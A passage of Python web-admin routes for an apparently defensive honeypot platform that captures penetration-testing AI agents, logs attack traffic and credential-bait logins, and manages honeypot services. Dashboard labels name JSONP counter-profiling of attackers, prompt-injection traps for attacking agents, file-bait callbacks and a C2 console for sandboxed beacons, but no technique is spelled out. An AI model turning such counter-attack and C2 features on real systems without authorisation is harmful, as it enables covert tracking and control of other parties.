            {"title": "AgentCapture - 渗透智能体捕获系统", "error": "用户名或密码错误"},
        )
    create_login_log(
        db,
        user_id=user.id,
        username=user.username,
        login_status="success",
        ip_address=source_ip,
        user_agent=user_agent,
    )
    request.session.clear()
    request.session["user_id"] = user.id
    return _redirect("/admin")


@router.get("/admin/logout")
def admin_logout(request: Request):
    request.session.clear()
    return _redirect("/admin/login")


@router.get("/admin", response_class=HTMLResponse)
def admin_dashboard(request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    return _render(request, "admin/dashboard.html", {"user": user, **_dashboard_context(db)})


def _dashboard_context(db: Session) -> dict:
    stats = dashboard_stats(db)
    summary_labels = {
        "total_events": "事件总数",
        "high_risk_events": "高风险事件",
        "unique_ips": "攻击来源 IP",
        "online_nodes": "在线节点",
        "services_count": "服务数",
        "templates_count": "模板数",
        "decoy_count": "蜜饵模板",
        "deployments_count": "蜜饵部署",
        "users_count": "用户数",
        "alert_channels": "通知配置",
        "alert_policies": "告警策略",
        "intel_entries": "情报条目",
        "login_failures": "登录失败",
        "credential_attempts": "凭证蜜饵",
        "execution_count": "执行记录",
        "recon_events": "Jsonp画像",
        "agent_interactions": "Agent 回显",
        "agent_blocks": "Agent 阻断",
        "payload_downloads": "文件蜜饵下载",
        "payload_callbacks": "文件蜜饵回调",
    }
    primary_keys = [
        "total_events",
        "high_risk_events",
        "unique_ips",
        "online_nodes",
        "credential_attempts",
        "agent_interactions",
        "payload_callbacks",
    ]
    summary_meta = {
        "total_events": {"tone": "info", "note": "采集到的总事件"},
        "high_risk_events": {"tone": "danger", "note": "风险分 ≥ 70"},
        "unique_ips": {"tone": "warning", "note": "独立来源地址"},
        "online_nodes": {"tone": "success", "note": "在线探针节点"},
        "credential_attempts": {"tone": "warning", "note": "账号口令尝试"},
        "agent_interactions": {"tone": "danger", "note": "Agent 行为命中"},
        "payload_callbacks": {"tone": "info", "note": "Payload 回调"},
    }
    summary_cards = [
        {
            "key": key,
            "label": summary_labels.get(key, key),
            "value": stats["summary"].get(key, 0),
            **summary_meta.get(key, {"tone": "default", "note": ""}),
        }
        for key in primary_keys
    ]
    secondary_summary_rows = [
        {"key": key, "label": summary_labels.get(key, key), "value": value}
        for key, value in stats["summary"].items()
        if key not in primary_keys
    ]
    chain_stats = attack_chain(db)
    chain = {
        "扫描感知": chain_stats["scan"],
        "攻击行为": chain_stats["attack"],
        "登录尝试": chain_stats["login_attempt"],
        "高危登录": chain_stats["high_risk_login"],
        "失陷线索": chain_stats["compromise_hint"],
    }
    chain_max = max(chain.values()) if chain else 0
    chain_visual = [
        {
            "label": label,
            "value": value,
            "percent": int((value / chain_max) * 100) if chain_max else 0,
        }
        for label, value in chain.items()
    ]
    system_labels = {
        "hostname": "主机名",
        "platform": "平台",
        "python_version": "Python 版本",
        "cpu_percent": "CPU 使用率",
        "memory_percent": "内存使用率",
        "memory_used_mb": "内存占用 (MB)",
        "disk_percent": "磁盘使用率",
        "disk_used_gb": "磁盘占用 (GB)",
        "uptime_seconds": "运行时长 (s)",
    }
    system_cards = [
        {"key": key, "label": system_labels.get(key, key), "value": value}
        for key, value in stats["system"].items()
    ]

    def _system_percent(key: str) -> float:
        try:
            return max(0.0, min(100.0, float(stats["system"].get(key) or 0)))
        except (TypeError, ValueError):
            return 0.0

    uptime_seconds = int(stats["system"].get("uptime_seconds") or 0)
    uptime_days, uptime_rem = divmod(uptime_seconds, 86400)
    uptime_hours, uptime_rem = divmod(uptime_rem, 3600)
    uptime_minutes, uptime_secs = divmod(uptime_rem, 60)
    if uptime_days:
        uptime_display = f"{uptime_days}天 {uptime_hours}时"
    elif uptime_hours:
        uptime_display = f"{uptime_hours}时 {uptime_minutes}分"
    elif uptime_minutes:
        uptime_display = f"{uptime_minutes}分"
    else:
        uptime_display = f"{uptime_secs}秒"
    system_dashboard_cards = [
        {
            "key": "cpu_percent",
            "label": "CPU 使用率",
            "percent": _system_percent("cpu_percent"),
            "display": f"{_system_percent('cpu_percent'):.1f}%",
            "tone": "info",
            "caption": "处理器实时负载",
        },
        {
            "key": "memory_percent",
            "label": "内存使用率",
            "percent": _system_percent("memory_percent"),
            "display": f"{_system_percent('memory_percent'):.1f}%",
            "tone": "purple",
            "caption": "系统内存压力",
        },
        {
            "key": "disk_percent",
            "label": "磁盘使用率",
            "percent": _system_percent("disk_percent"),
            "display": f"{_system_percent('disk_percent'):.1f}%",
            "tone": "warning",
            "caption": "根分区空间压力",
        },
        {
            "key": "uptime_seconds",
            "label": "运行时长",
            "percent": min(100, max(8, int((uptime_seconds / 86400) * 100)))
            if uptime_seconds
            else 8,
            "display": uptime_display,
            "tone": "success",
            "caption": "服务连续运行",
        },
    ]
    trends = attack_trends(db)
    trend_compare = attack_trends_previous(db, days=len(trends))
    trend_scale_max = max(max([item["count"] for item in trends] or [0]), max(trend_compare or [0]))
    trend_visual = [
        {
            **item,
            "height": 10 + int((item["count"] / trend_scale_max) * 90) if trend_scale_max else 10,
            "short_day": item["day"][5:] if len(item["day"]) >= 10 else item["day"],
        }
        for item in trends
    ]
    trend_compare_visual = [
        {
            "count": count,
            "height": 10 + int((count / trend_scale_max) * 90) if trend_scale_max else 10,
        }
        for count in trend_compare
    ]
    c2_summary = agent_stats(db)
    feature_modules = [
        {
            "title": "监测分析",
            "icon": "activity",
            "tone": "info",
            "href": "/admin",
            "metric": stats["summary"].get("total_events", 0),
            "metric_label": "事件",
            "description": "只保留值守入口：控制台、态势大屏与攻击流量；蜜饵命中记录归入反制溯源。",
            "links": [
                {"label": "控制台", "href": "/admin"},
                {"label": "态势大屏", "href": "/admin/big-screen"},
                {"label": "攻击流量", "href": "/admin/attacks"},
            ],
        },
        {
            "title": "反制溯源",
            "icon": "crosshair",
            "tone": "warning",
            "href": "/admin/recon-data",
            "metric": stats["summary"].get("recon_events", 0)
            + stats["summary"].get("agent_interactions", 0)
            + stats["summary"].get("payload_callbacks", 0)
            + stats["summary"].get("credential_attempts", 0),
            "metric_label": "线索",
            "description": "把 Jsonp 反制成功记录、提示词注入触发记录、文件蜜饵下载和凭证蜜饵登陆组合成反制证据链。",
            "links": [
                {"label": "Jsonp反制成功记录", "href": "/admin/recon-data"},
                {"label": "提示词注入触发记录", "href": "/admin/agent-interactions"},
                {"label": "文件蜜饵下载记录", "href": "/admin/payload-tracking"},
                {"label": "凭证蜜饵登陆记录", "href": "/admin/credentials"},
            ],
        },
        {
            "title": "部署运营",
            "icon": "server",
            "tone": "success",
            "href": "/admin/nodes",
            "metric": stats["summary"].get("online_nodes", 0),
            "metric_label": "在线节点",
            "description": "围绕节点、端口服务、Web 应用、蜜饵、提示词注入与 Jsonp 模版构建持续运营的蜜罐资产面。",
            "links": [
                {"label": "节点管理", "href": "/admin/nodes"},
                {"label": "端口服务蜜罐管理", "href": "/admin/services"},
                {"label": "Web应用蜜罐管理", "href": "/admin/templates"},
                {"label": "互联网系统接入", "href": "/admin/internet-systems"},
                {"label": "蜜饵管理", "href": "/admin/decoy-management"},
                {"label": "提示词注入管理", "href": "/admin/prompt-injection"},
                {"label": "Jsonp模版管理", "href": "/admin/jsonp-templates"},
            ],
        },
        {
            "title": "C2 控制",
            "icon": "bot",
            "tone": "danger",
            "href": "/admin/c2/console",
            "metric": c2_summary.get("active", 0),
            "metric_label": "活跃 Agent",
            "description": "为竞赛沙箱中的 Agent Beacon、任务队列、命令投递和样本捆绑提供独立控制面。",
            "links": [
                {"label": "C2 Console", "href": "/admin/c2/console"},
                {"label": "Agent 管理", "href": "/admin/c2/agents"},
                {"label": "C2 Console · 任务队列", "href": "/admin/c2/console"},
            ],
        },
        {
            "title": "平台设置",
            "icon": "settings",
            "tone": "info",
            "href": "/admin/execution-history",
            "metric": stats["summary"].get("total", 0)
            + stats["summary"].get("users_count", 0),
            "metric_label": "配置项",
            "description": "收口展示执行历史、登陆日志、用户管理与个人资料设置。",
            "links": [
                {"label": "执行历史", "href": "/admin/execution-history"},
                {"label": "登陆日志", "href": "/admin/login-logs"},
                {"label": "用户管理", "href": "/admin/users"},
                {"label": "系统设置", "href": "/admin/profile"},
            ],
        },
    ]
    return {
        "title": "控制台",
        "stats": stats,
        "summary_cards": summary_cards,
        "secondary_summary_rows": secondary_summary_rows,
        "system_cards": system_cards,
        "system_dashboard_cards": system_dashboard_cards,
        "trends": trends,
        "trend_visual": trend_visual,
        "trend_compare_visual": trend_compare_visual,
        "chain": chain,
        "chain_visual": chain_visual,
        "feature_modules": feature_modules,
        "c2_summary": c2_summary,
        "recent_attacks": aggregated_attacks(db, limit=10),
        "recent_sources": aggregated_attack_sources(db, limit=10),
        "recent_exec": list_execution_history(db, limit=10),
    }


@router.get("/admin/dashboard", response_class=HTMLResponse)
def admin_dashboard_legacy(request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    return _render(
        request, "admin/dashboard.html", {"current_user": user, **_dashboard_context(db)}
    )


@router.get("/admin/attacks", response_class=HTMLResponse)
def admin_attacks(
    request: Request,
    date_from: str = "",
    date_to: str = "",
    source_ip: str = "",
    site_id: str = "",
    db: Session = Depends(get_db),
):
    user = _require_user(request, db)
    items = aggregated_attacks(
        db,
        limit=200,
        date_from=date_from or None,
        date_to=date_to or None,
        source_ip=source_ip or None,
        site_id=site_id or None,
    )
    from app.models.isolation import IsolationEntry

    active_isolations = int(
        db.scalar(select(func.count()).select_from(IsolationEntry)) or 0
    )
    return _render(
        request,
        "admin/attacks.html",
        {
            "title": "攻击流量",
            "current_user": user,
            "items": items,
            "active_isolations": active_isolations,
            "filters": {
                "date_from": date_from,
                "date_to": date_to,
                "source_ip": source_ip,
                "site_id": site_id,
            },
            "export_href": "/admin/attacks/export.csv"
            + _qs(
                date_from=date_from or None,
                date_to=date_to or None,
                source_ip=source_ip or None,
                site_id=site_id or None,
            ),
        },
    )


@router.post("/admin/attacks/clear")
def admin_attacks_clear(
    request: Request,
    date_from: str = Form(""),
    date_to: str = Form(""),
    source_ip: str = Form(""),
    site_id: str = Form(""),
    scope: str = Form("all"),
    db: Session = Depends(get_db),
):
    """Delete historical traffic data across the three record surfaces:
    traffic events, credential-bait login records (credential_observations
    + login_logs) and honeypot session transcripts — optionally scoped to
    the active filters. Honours the observe-only prefixes: decoy/portal
    surfaces keep their evidence even in a full wipe (they are the
    attribution record)."""
    user = _require_admin(request, db)

    conditions = []
    if date_from:
        try:
            conditions.append(
                Event.created_at
                >= datetime.fromisoformat(date_from).replace(tzinfo=timezone.utc)
            )
        except ValueError:
            pass
    if date_to:
        try:
            end = datetime.fromisoformat(date_to).replace(
                hour=23, minute=59, second=59, tzinfo=timezone.utc
            )
            conditions.append(Event.created_at <= end)
        except ValueError:
            pass
    if source_ip:
        conditions.append(Event.source_ip == source_ip)
    if site_id:
        conditions.append(Event.site_id == site_id)
    if scope != "all":
        # preserve decoy/portal/attribution surfaces
        from app.middleware.injector import OBSERVE_ONLY_PREFIXES

        like = "|".join(p.rstrip("/") + "/%" for p in OBSERVE_ONLY_PREFIXES)
        conditions.append(~Event.path.like(like))

    stmt = delete(Event)
    for cond in conditions:
        stmt = stmt.where(cond)
    result = db.execute(stmt)
    deleted_events = int(result.rowcount or 0)

    # --- credential bait login records (credential page + login logs) ---
    from app.models.credential import CredentialObservation
    from app.models.login_log import LoginLog

    cred_conditions = []
    login_conditions = []
    if date_from:
        try:
            start = datetime.fromisoformat(date_from).replace(tzinfo=timezone.utc)
            cred_conditions.append(CredentialObservation.created_at >= start)
            login_conditions.append(LoginLog.created_at >= start)
        except ValueError:
            pass
    if date_to:
        try:
            end = datetime.fromisoformat(date_to).replace(
                hour=23, minute=59, second=59, tzinfo=timezone.utc
            )
            cred_conditions.append(CredentialObservation.created_at <= end)
            login_conditions.append(LoginLog.created_at <= end)
        except ValueError:
            pass
    if source_ip:
        cred_conditions.append(CredentialObservation.source_ip == source_ip)
        login_conditions.append(LoginLog.ip_address == source_ip)

    deleted_creds = 0
    deleted_logins = 0
    # NOTE: an empty condition list means "no restriction" (full wipe), not
    # "skip this table" — scope=all must still purge these surfaces.
    result = db.execute(delete(CredentialObservation).where(*cred_conditions))
    deleted_creds = int(result.rowcount or 0)
    result = db.execute(delete(LoginLog).where(*login_conditions))
    deleted_logins = int(result.rowcount or 0)

    # --- honeypot session transcripts ---
    from app.models.honeypot_session import HoneypotSession

    session_conditions = []
    if date_from:
        try:
            start = datetime.fromisoformat(date_from).replace(tzinfo=timezone.utc)
            session_conditions.append(HoneypotSession.started_at >= start)
        except ValueError:
            pass
    if date_to:
        try:
            end = datetime.fromisoformat(date_to).replace(
                hour=23, minute=59, second=59, tzinfo=timezone.utc
            )
            session_conditions.append(HoneypotSession.started_at <= end)
        except ValueError:
            pass
    if source_ip:
        session_conditions.append(HoneypotSession.source_ip == source_ip)
    deleted_sessions = 0
    result = db.execute(delete(HoneypotSession).where(*session_conditions))
    deleted_sessions = int(result.rowcount or 0)

    db.commit()
    total = deleted_events + deleted_creds + deleted_logins + deleted_sessions
    log_execution(
        db,
        actor_username=user.username,
        action="clear-events",
        module="attacks",
        target_type="events",
        target_ref=f"scope={scope}",
        status="success",
        detail_json={
            "deleted_events": deleted_events,
            "deleted_credential_observations": deleted_creds,
            "deleted_login_logs": deleted_logins,
            "deleted_honeypot_sessions": deleted_sessions,
            "filters": {
                "date_from": date_from, "date_to": date_to,
                "source_ip": source_ip, "site_id": site_id,
            },
        },
    )
    return _redirect(
        "/admin/attacks"
        + _qs(
            saved=(
                f"已清除 {total} 条历史数据：流量事件 {deleted_events}、"
                f"凭证蜜饵登陆 {deleted_creds + deleted_logins}、蜜罐会话 {deleted_sessions}"
            )
        )
    )


@router.get("/admin/attacks/export.csv")
def admin_attacks_export(
    request: Request,
    date_from: str = "",
    date_to: str = "",
    source_ip: str = "",
    site_id: str = "",
    db: Session = Depends(get_db),
):
    _require_user(request, db)
    items = aggregated_attacks(
        db,
        limit=2000,
        date_from=date_from or None,
        date_to=date_to or None,
        source_ip=source_ip or None,
        site_id=site_id or None,
    )
    rows = [
        {
            "source_ip": item["source_ip"],
            "site_id": item["site_id"],
            "session_id": item["session_id"],
            "count": item["count"],
            "first_seen": format_dt(item["first_seen"]),
            "last_seen": format_dt(item["last_seen"]),
            "top_path": item["top_path"],
            "top_decision": item["top_decision"],
            "risk_score_max": item["risk_score_max"],
            "top_signals": " | ".join(item["top_signals"]),
        }
        for item in items
    ]
    return _csv_response(
        "attacks.csv",
        rows,
        fieldnames=[
            "source_ip",
            "site_id",
            "session_id",
            "count",
            "first_seen",
            "last_seen",
            "top_path",
            "top_decision",
            "risk_score_max",
            "top_signals",
        ],
    )


@router.get("/admin/attacks/{session_id}", response_class=HTMLResponse)
def admin_attack_detail(session_id: str, request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    detail = session_detail(db, session_id)
    if not detail:
        raise HTTPException(status_code=404, detail="session not found")
    return _render(
        request,
        "admin/attack_detail.html",
        {"title": "攻击详情", "current_user": user, "detail": detail, "nav_base": "/admin/attacks"},
    )


@router.get("/admin/sessions/{session_id}", response_class=HTMLResponse)
def admin_session_portrait(session_id: str, request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    detail = session_detail(db, session_id)
    if not detail:
        raise HTTPException(status_code=404, detail="session not found")
    return _render(
        request,
        "admin/session_portrait.html",
        {"title": "会话画像", "current_user": user, "detail": detail, "nav_base": "/admin/attacks"},
    )


@router.get("/admin/attack-sources", response_class=HTMLResponse)
def admin_attack_sources(
    request: Request,
    date_from: str = "",
    date_to: str = "",
    source_ip: str = "",
    site_id: str = "",
    db: Session = Depends(get_db),
):
    user = _require_user(request, db)
    items = aggregated_attack_sources(
        db,
        limit=200,
        date_from=date_from or None,
        date_to=date_to or None,
        source_ip=source_ip or None,
        site_id=site_id or None,
    )
    return _render(
        request,
        "admin/attack_sources.html",
        {
            "title": "攻击来源",
            "current_user": user,
            "items": items,
            "filters": {
                "date_from": date_from,
                "date_to": date_to,
                "source_ip": source_ip,
                "site_id": site_id,
            },
            "export_href": "/admin/attack-sources/export.csv"
            + _qs(
                date_from=date_from or None,
                date_to=date_to or None,
                source_ip=source_ip or None,
                site_id=site_id or None,
            ),
        },
    )


@router.get("/admin/attack-sources/export.csv")
def admin_attack_sources_export(
    request: Request,
    date_from: str = "",
    date_to: str = "",
    source_ip: str = "",
    site_id: str = "",
    db: Session = Depends(get_db),
):
    _require_user(request, db)
    items = aggregated_attack_sources(
        db,
        limit=2000,
        date_from=date_from or None,
        date_to=date_to or None,
        source_ip=source_ip or None,
        site_id=site_id or None,
    )
    rows = [
        {
            "source_ip": item["source_ip"],
            "count": item["count"],
            "first_seen": format_dt(item["first_seen"]),
            "last_seen": format_dt(item["last_seen"]),
            "top_site": item["top_site"],
            "top_path": item["top_path"],
            "top_decision": item["top_decision"],
            "top_signals": " | ".join(item["top_signals"]),
        }
        for item in items
    ]
    return _csv_response(
        "attack_sources.csv",
        rows,
        fieldnames=[
            "source_ip",
            "count",
            "first_seen",
            "last_seen",
            "top_site",
            "top_path",
            "top_decision",
            "top_signals",
        ],
    )


@router.get("/admin/attack-sources/{source_ip}", response_class=HTMLResponse)
def admin_source_profile(source_ip: str, request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    profile = source_profile(db, source_ip)
    if not profile:
        raise HTTPException(status_code=404, detail="source not found")
    return _render(
        request,
        "admin/source_profile.html",
        {
            "title": "来源画像",
            "current_user": user,
            "profile": profile,
            "nav_base": "/admin/attack-sources",
        },
    )


@router.get("/admin/credentials", response_class=HTMLResponse)
def admin_credentials(
    request: Request,
    date_from: str = "",
    date_to: str = "",
    source_ip: str = "",
    node_name: str = "",
    db: Session = Depends(get_db),
):
    user = _require_user(request, db)
    context = credential_asset_context(
        db,
        limit=200,
        date_from=date_from or None,
        date_to=date_to or None,
        source_ip=source_ip or None,
        node_name=node_name or None,
    )
    return _render(
        request,
        "admin/credentials.html",
        {
            "title": "凭证蜜饵登陆记录",
            "current_user": user,
            "filters": {
                "date_from": date_from,
                "date_to": date_to,
                "source_ip": source_ip,
                "node_name": node_name,
            },
            "export_href": "/admin/credentials/export.csv"
            + _qs(
                date_from=date_from or None,
                date_to=date_to or None,
                source_ip=source_ip or None,
                node_name=node_name or None,
            ),
            **context,
        },
    )


@router.get("/admin/credentials/export.csv")
def admin_credentials_export(
    request: Request,
    date_from: str = "",
    date_to: str = "",
    source_ip: str = "",
    node_name: str = "",
    db: Session = Depends(get_db),
):
    _require_user(request, db)
    context = credential_asset_context(
        db,
        limit=2000,
        date_from=date_from or None,
        date_to=date_to or None,
        source_ip=source_ip or None,
        node_name=node_name or None,
    )
    rows = [
        {
            "created_at": format_dt(item["created_at"]),
            "source_ip": item["source_ip"],
            "node_name": item["node_name"],
            "service_name": item["service_name"],
            "source_label": item.get("source_label", ""),
            "username": item["username"],
            "password": item["password"],
            "path": item["path"],
            "session_id": item["session_id"],
            "keywords": " | ".join(item["keywords"]),
            "risk_score": item["risk_score"],
        }
        for item in context["items"]
    ]
    return _csv_response(
        "credential_assets.csv",
        rows,
        fieldnames=[
            "created_at",
            "source_ip",
            "node_name",
            "service_name",
            "source_label",
            "username",
            "password",
            "path",
            "session_id",
            "keywords",
            "risk_score",
        ],
    )


@router.get("/admin/nodes", response_class=HTMLResponse)
def admin_nodes(request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    nodes = node_listing_with_runtime(db)
    templates_list = db.scalars(select(ServiceTemplate).order_by(ServiceTemplate.name)).all()
    service_name_map = {
        item.service_key: item.name
        for item in db.scalars(
            select(ServiceCatalog).order_by(ServiceCatalog.category, ServiceCatalog.name)
        ).all()
    }
    return _render(
        request,
        "admin/nodes.html",
        {
            "title": "节点管理",
            "current_user": user,
            "nodes": nodes,
            "templates_list": templates_list,
            "service_name_map": service_name_map,
        },
    )


@router.get("/admin/nodes/{node_id}", response_class=HTMLResponse)
def admin_node_detail(node_id: int, request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    bundle = node_detail_bundle(db, node_id)
    if not bundle:
        raise HTTPException(status_code=404, detail="node not found")
    service_name_map = {
        item.service_key: item.name
        for item in db.scalars(
            select(ServiceCatalog).order_by(ServiceCatalog.category, ServiceCatalog.name)
        ).all()
    }
    return _render(
        request,
        "admin/node_detail.html",
        {
            "title": "节点详情",
            "current_user": user,
            "nav_base": "/admin/nodes",
            "service_name_map": service_name_map,
            **bundle,
        },
    )


@router.post("/admin/nodes")
def create_node(
    request: Request,
    name: str = Form(...),
    listen_address: str = Form(...),
    callback_address: str = Form(...),
    node_type: str = Form("remote"),
    template_id: int | None = Form(None),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    deployed_services = []
    if template_id:
        template = db.get(ServiceTemplate, template_id)
        deployed_services = template.services_json if template else []
    node = Node(
        name=name,
        listen_address=listen_address,
        callback_address=callback_address,
        node_type=node_type,
        template_id=template_id,
        deployed_services_json=deployed_services,
        status="online",
    )
    db.add(node)
    db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action="create",
        module="nodes",
        target_type="node",
        target_ref=name,
    )
    return _redirect("/admin/nodes")


@router.post("/admin/nodes/{node_id}/template")
def assign_node_template(
    node_id: int,
    request: Request,
    template_id: int = Form(...),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    node = db.get(Node, node_id)
    template = db.get(ServiceTemplate, template_id)
    if not node or not template:
        raise HTTPException(status_code=404)
    node.template_id = template.id
    node.deployed_services_json = template.services_json
    node.updated_at = datetime.now(timezone.utc)
    db.add(node)
    db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action="assign-template",
        module="nodes",
        target_type="node",
        target_ref=node.name,
        detail_json={"template": template.name},
    )
    return _redirect("/admin/nodes")


@router.post("/admin/nodes/{node_id}/status")
def update_node_status(
    node_id: int,
    request: Request,
    status_value: str = Form(...),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    node = db.get(Node, node_id)
    if not node:
        raise HTTPException(status_code=404)
    node.status = status_value
    node.last_seen_at = datetime.now(timezone.utc)
    db.add(node)
    db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action="status",
        module="nodes",
        target_type="node",
        target_ref=node.name,
        detail_json={"status": status_value},
    )
    return _redirect("/admin/nodes")


@router.post("/admin/nodes/{node_id}/delete")
def delete_node(node_id: int, request: Request, db: Session = Depends(get_db)):
    _require_admin(request, db)
    node = db.get(Node, node_id)
    if not node:
        raise HTTPException(status_code=404)
    if node.is_builtin:
        raise HTTPException(status_code=400, detail="built-in node cannot be deleted")
    return _queue_sensitive_action(
        request,
        action="delete_node",
        params={"node_id": node_id},
        return_to="/admin/nodes",
        title=f"删除节点：{node.name}",
        description="该操作会删除节点记录并停止后续节点管理，请输入管理员密码确认。",
    )


@router.post("/admin/nodes/{node_id}/tasks")
def queue_runtime_task(
    node_id: int,
    request: Request,
    task_type: str = Form(...),
    priority: int = Form(50),
    notes: str = Form(""),
    payload_json: str = Form("{}"),
    db: Session = Depends(get_db),
):
    _require_admin(request, db)
    node = db.get(Node, node_id)
    if not node:
        raise HTTPException(status_code=404)
    return _queue_sensitive_action(
        request,
        action="queue_node_task",
        params={
            "node_id": node_id,
            "task_type": task_type,
            "priority": priority,
            "notes": notes or None,
            "task_payload_json": _parse_json(payload_json, {}),
        },
        return_to=f"/admin/nodes/{node_id}",
        title=f"投递节点任务：{node.name}",
        description="该操作会向节点任务队列投递新的执行项，请输入管理员密码确认。",
    )


@router.get("/admin/services", response_class=HTMLResponse)
def admin_services(request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    from app.services.honeypot_services import (
        port_listening,
        running_services,
        supported_services,
        sync_services_status,
    )

    # Keep DB status in sync with the real runtime so the page never shows a
    # stale running/stopped flag after a crash, manual start, or restart.
    sync_services_status(db)
    items = db.scalars(
        select(ServiceCatalog).order_by(ServiceCatalog.category, ServiceCatalog.name)
    ).all()
    running = running_services()
    # Ground truth: the in-memory map is per-process — a stale worker from a
    # hot reload can hold the port while this process believes it stopped.
    listening = {item.service_key: port_listening(item.default_port) for item in items}
    return _render(
        request,
        "admin/services.html",
        {
            "title": "端口服务蜜罐管理",
            "current_user": user,
            "items": items,
            "running": running,
            "listening": listening,
            "supported": supported_services(),
            "error": request.query_params.get("error", ""),
        },
    )


@router.get("/admin/honeypot-sessions", response_class=HTMLResponse)
def admin_honeypot_sessions(request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    from datetime import datetime, timezone

    from app.models.honeypot_session import HoneypotSession

    source_ip = request.query_params.get("source_ip", "").strip()
    status = request.query_params.get("status", "").strip()
    stmt = select(HoneypotSession).order_by(HoneypotSession.started_at.desc()).limit(200)
    if source_ip:
        stmt = stmt.where(HoneypotSession.source_ip == source_ip)
    if status in ("active", "closed"):
        stmt = stmt.where(HoneypotSession.status == status)
    rows = db.scalars(stmt).all()
    now = datetime.now(timezone.utc)
    stats = {
        "total": int(db.scalar(select(func.count()).select_from(HoneypotSession)) or 0),
        "active": int(
            db.scalar(
                select(func.count())
                .select_from(HoneypotSession)
                .where(HoneypotSession.status == "active")
            )
            or 0
        ),
        "commands": int(
            db.scalar(select(func.coalesce(func.sum(HoneypotSession.command_count), 0))) or 0
        ),
        "auth_attempts": int(
            db.scalar(select(func.coalesce(func.sum(HoneypotSession.auth_attempts), 0))) or 0
        ),
    }
    # annotate each row with a display duration
    items = []
    for row in rows:
        end = row.ended_at or now
        duration_s = max(0, int((end - row.started_at).total_seconds())) if row.started_at else 0
        items.append({"row": row, "duration_s": duration_s})
    return _render(
        request,
        "admin/honeypot_sessions.html",
        {
            "title": "蜜罐会话回放",
            "current_user": user,
            "items": items,
            "stats": stats,
            "filter_source_ip": source_ip,
            "filter_status": status,
            "now": now,
        },
    )


@router.get("/admin/honeypot-sessions/{session_pk}", response_class=HTMLResponse)
def admin_honeypot_session_detail(session_pk: int, request: Request, db: Session = Depends(get_db)):
    user = _require_user(request, db)
    from datetime import datetime, timezone

    from app.models.honeypot_session import HoneypotSession

    row = db.get(HoneypotSession, session_pk)
    if not row:
        raise HTTPException(status_code=404)
    transcript = list(row.transcript_json or [])
    end = row.ended_at or datetime.now(timezone.utc)
    duration_s = (
        max(0, int((end - row.started_at).total_seconds())) if row.started_at else 0
    )
    return _render(
        request,
        "admin/honeypot_session.html",
        {
            "title": f"会话回放 · {row.source_ip}",
            "current_user": user,
            "row": row,
            "transcript": transcript,
            "duration_s": duration_s,
        },
    )


@router.post("/admin/services")
def create_service(
    request: Request,
    service_key: str = Form(...),
    name: str = Form(...),
    category: str = Form(...),
    default_port: int = Form(...),
    protocols_csv: str = Form(...),
    description: str = Form(""),
    preview_path: str = Form(""),
    db: Session = Depends(get_db),
):
    user = _require_admin(request, db)
    item = ServiceCatalog(
        service_key=service_key,
        name=name,
        category=category,
        default_port=default_port,
        protocols_json=[part.strip() for part in protocols_csv.split(",") if part.strip()],
        description=description,
        preview_path=preview_path or None,
    )
    db.add(item)
    db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action="create",
        module="services",
        target_type="service",
        target_ref=service_key,
    )
    return _redirect("/admin/services")


@router.post("/admin/services/{service_id}/delete")
def delete_service(service_id: int, request: Request, db: Session = Depends(get_db)):
    _require_admin(request, db)
    item = db.get(ServiceCatalog, service_id)
    if not item:
        return _redirect("/admin/services")
    return _queue_sensitive_action(
        request,
        action="delete_service",
        params={"service_id": service_id},
        return_to="/admin/services",
        title=f"删除服务：{item.name}",
        description="服务删除后将无法继续被模板和节点引用，请输入管理员密码确认。",
    )


@router.post("/admin/services/{service_id}/start")
def start_honeypot_service(service_id: int, request: Request, db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    item = db.get(ServiceCatalog, service_id)
    if not item:
        return _redirect("/admin/services")
    from app.services.honeypot_services import start_service

    try:
        ok = start_service(item.service_key, item.default_port)
    except OSError as exc:
        return _redirect(
            "/admin/services"
            + _qs(error=f"启动 {item.name} 失败：端口 {item.default_port} 已被占用（{exc}）")
        )
    if not ok:
        return _redirect(
            "/admin/services" + _qs(error=f"启动 {item.name} 失败：无可用处理器或服务已在运行")
        )
    item.status = "running"
    db.add(item)
    db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action="start-service",
        module="services",
        target_type="service",
        target_ref=f"{item.service_key}:{item.default_port}",
    )
    from app.services.alert_dispatcher import AlertPayload, get_alert_dispatcher
    from app.services.events import extract_client_ip

    get_alert_dispatcher().start_event(
        AlertPayload(
            event_type="service_started",
            source_ip=extract_client_ip(request),
            decision="observe",
            risk_score=0,
            signals=["service_started", item.service_key],
            path=request.url.path,
            method=request.method,
            summary=f"honeypot service started: {item.service_key}:{item.default_port}",
            timestamp=datetime.now(timezone.utc),
        )
    )
    return _redirect("/admin/services")


@router.post("/admin/services/{service_id}/stop")
def stop_honeypot_service(service_id: int, request: Request, db: Session = Depends(get_db)):
    user = _require_admin(request, db)
    item = db.get(ServiceCatalog, service_id)
    if not item:
        return _redirect("/admin/services")
    from app.services.honeypot_services import stop_service

    stop_service(item.service_key)
    item.status = "stopped"
    db.add(item)
    db.commit()
    log_execution(
        db,
        actor_username=user.username,
        action="stop-service",
        module="services",
        target_type="service",
        target_ref=item.service_key,
    )
    from app.services.alert_dispatcher import AlertPayload, get_alert_dispatcher
    from app.services.events import extract_client_ip

    get_alert_dispatcher().start_event(
        AlertPayload(
            event_type="service_stopped",
            source_ip=extract_client_ip(request),
            decision="observe",
            risk_score=0,
            signals=["service_stopped", item.service_key],
            path=request.url.path,
            method=request.method,
            summary=f"honeypot service stopped: {item.service_key}",
            timestamp=datetime.now(timezone.utc),
        )
    )
    return _redirect("/admin/services")


def _default_honeypot_row(db: Session) -> ServiceCatalog | None:
